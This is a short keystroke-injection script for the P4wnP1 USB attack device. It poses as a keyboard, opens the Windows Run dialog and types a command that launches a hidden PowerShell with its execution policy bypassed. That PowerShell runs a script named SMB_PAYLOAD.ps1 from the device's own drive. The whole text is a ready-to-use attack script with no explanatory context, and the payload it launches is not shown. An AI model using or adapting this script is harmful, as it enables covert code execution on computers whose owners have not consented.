//SMB_PAYLOAD
layout('us');
typingSpeed(0,0)
press("GUI r");
delay(500);
type("cmd /C start /MIN powershell -executionpolicy Bypass .((gwmi win32_volume -f 'label=''P4WNP1''').Name+'\\payload\\SMB_PAYLOAD.ps1')\n")
delay(1000);
